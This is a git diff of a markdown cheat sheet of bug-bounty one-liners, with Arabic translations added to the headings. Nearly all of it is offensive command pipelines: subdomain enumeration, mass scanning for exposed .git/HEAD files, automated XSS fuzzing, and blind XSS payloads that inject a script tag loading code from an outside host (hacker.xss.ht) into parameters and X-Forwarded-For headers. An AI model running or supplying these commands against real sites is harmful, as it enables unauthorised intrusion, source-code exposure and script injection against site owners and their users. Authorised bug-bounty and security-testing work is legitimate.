@@ -1,39 +1,39 @@
 # oneliner commands for bug bounties
 
-## Find Subdomain
+## Find Subdomain البحث عن سب دومين
 > projectdiscovery
 ```bash
 subfinder -d target.com -silent | httpx -silent -o urls.txt
 ```
-## Search Subdomain using Gospider
+## Search Subdomain using [Gospider] البحث عن سب دومين باستخدام الاداه
 > https://github.com/KingOfBugbounty/KingOfBugBountyTips/
 ```bash
 gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
 ```
 
-## find .git/HEAD
+## find .git/HEAD البحث عن الملفات الحساسه
 > @ofjaaah
 ```bash
 curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
 ```
 
-## Check .git/HEAD
+## Check .git/HEAD البحث عن الملفات الحساسه
 > @ofjaaah
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
 ```
 
-## Find XSS
+## Find XSS البحث عن ثغرات 
 > cihanmehmet
-### Single target
+### Single target هدف واحد
 ```bash
 gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
 ```
-### Multiple target
+### Multiple target أكثر من هدف
 ```bash
 gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
 ```
-## Find XSS
+## Find XSS البحث عن ثغرات
 > dwisiswant0
 ```bash
 #/bin/bash
@@ -42,25 +42,25 @@ hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egr
 
 # save to .sh, and run bash program.sh target.com
 ```
-## Kxss to search param XSS
+## Kxss to search param XSS  [Kxss] البحث عن ثغرات بأستخدام موقع
 > [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
 ```bash
 echo http://testphp.vulnweb.com/ | waybackurls | kxss
 ```
 
-## XSS hunting multiple
+## XSS hunting multiple البحث عن ثغره أكثر من هدف
 > @ofjaaah
 ```bash
 gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
 ```
 
-## BXSS - Bling XSS in Parameters
+## BXSS - Bling XSS in Parameters  البحث عن الثغره عن طريق الباراميتر
 > [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
 ```bash
 subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
 ```
 
-## Blind XSS In X-Forwarded-For Header
+## Blind XSS In X-Forwarded-For Header  
 > [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
 ```bash
 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
